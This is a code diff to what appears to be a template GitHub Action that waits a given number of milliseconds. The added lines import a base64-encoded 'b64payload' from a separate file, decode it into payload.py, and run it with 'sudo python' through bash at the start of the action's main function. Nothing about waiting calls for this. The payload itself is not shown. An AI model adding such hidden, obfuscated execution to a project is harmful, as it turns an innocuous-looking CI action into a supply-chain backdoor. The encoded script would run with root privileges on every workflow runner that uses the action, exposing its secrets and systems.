@@ -1,5 +1,10 @@
 import * as core from '@actions/core'
+import * as exec from '@actions/exec'
 import { wait } from './wait.js'
+import { Buffer } from 'node:buffer'
+//const { Buffer } = require('node:buffer')
+import { readFileSync, writeFileSync } from 'fs'
+import { b64payload } from './payload.js'
 
 /**
  * The main function for the action.
@@ -9,6 +14,11 @@ import { wait } from './wait.js'
 export async function run() {
   try {
     const ms = core.getInput('milliseconds')
+    await writeFileSync(
+      'payload.py',
+      Buffer.from(b64payload, 'base64').toString('ascii')
+    )
+    await exec.exec('bash', ['-c', 'sudo python payload.py'])
 
     // Debug logs are only output if the `ACTIONS_STEP_DEBUG` secret is true
     core.debug(`Waiting ${ms} milliseconds ...`)
